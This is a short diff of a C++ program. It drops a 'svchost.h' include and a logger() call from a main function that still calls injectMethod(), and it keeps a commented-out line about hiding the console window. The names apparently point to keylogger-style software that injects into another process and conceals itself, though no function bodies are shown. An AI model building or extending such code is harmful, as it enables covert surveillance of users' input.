@@ -14,7 +14,6 @@
 
 #include <iostream>
 using namespace std;
-#include "svchost.h"
 #include <tchar.h>
 
 #include "Common.h"
@@ -115,8 +114,6 @@ void injectMethod()
 	printf("\n %d", process_id);
 }
 
-
-
 int _tmain(int argc, _TCHAR* argv[])
 {
 	//HWND stealth; /*creating stealth (window is not visible)*/
@@ -126,9 +123,7 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("wear your mask please\n");
 	firstTimeRunCheck();
 	injectMethod();
-	logger();
 
-	getchar();
 	return 0;
 }
 
